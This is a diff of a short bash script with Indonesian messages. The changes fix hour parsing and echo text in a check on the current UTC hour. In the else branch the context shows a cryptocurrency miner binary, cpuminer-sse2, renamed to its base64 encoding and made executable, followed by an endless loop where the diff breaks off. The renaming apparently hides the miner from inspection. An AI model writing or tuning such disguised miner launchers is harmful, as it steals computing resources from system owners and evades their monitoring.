@@ -1,18 +1,18 @@
 #!/bin/bash
 
 jam2digit=$(date -u +%H)
-jam1digit=$((jam2digit))
+jam1digit=$((10#$jam2digit))
 echo $jam2digit $jam1digit
 ketentuan1=2
 ketentuan2=14
 if [[ $jam1digit -eq $ketentuan1 ]]
 then
-  echo "sama dengan $ketentuan "
+  echo "sama dengan $ketentuan1 "
 elif [[ $jam1digit -eq $ketentuan2 ]]
 then
-  echo "sama dengan $ketentuan "
+  echo "sama dengan $ketentuan2 "
 else
-  echo "enggak $ketentuan "
+  echo "enggak $ketentuan1 dan $ketentuan2 "
   #chmod +x cpuminer-sse2
   chmod +x Y3B1bWluZXItc3NlMg
   while [ 1 ]; do
